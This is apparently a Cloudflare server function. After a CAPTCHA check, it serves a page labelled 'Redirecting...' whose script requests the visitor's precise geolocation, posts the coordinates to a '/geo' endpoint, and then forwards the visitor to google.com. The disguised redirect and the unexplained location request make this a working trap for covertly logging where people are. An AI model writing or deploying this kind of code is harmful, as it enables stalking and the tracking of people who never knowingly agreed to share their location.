export async function onRequestPost({ request, env }) {
  const form = await request.formData();
  const token = form.get('cf-turnstile-response');
  const ip = request.headers.get("cf-connecting-ip");

  if (!token) return new Response("Missing CAPTCHA token", { status: 400 });

  // ✅ Verify Turnstile
  const verifyResp = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      secret: env.TURNSTILE_SECRET,
      response: token,
      remoteip: ip
    })
  });

  const verifyData = await verifyResp.json();

  if (!verifyData.success) {
    return new Response("CAPTCHA failed", { status: 403 });
  }

  // ✅ CAPTCHA passed — now send geolocation
  const html = `
    <!DOCTYPE html>
    <html>
    <head><title>Redirecting...</title></head>
    <body>
      <script>
        navigator.geolocation.getCurrentPosition(function(location) {
          fetch('/geo', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              lat: location.coords.latitude,
              lon: location.coords.longitude
            })
          }).finally(function() {
            window.location.href = "https://www.google.com";
          });
        }, function() {
          // If location access denied, still redirect
          window.location.href = "https://www.google.com";
        });
      </script>
    </body>
    </html>
  `;
  return new Response(html, {
    headers: { 'Content-Type': 'text/html' }
  });
}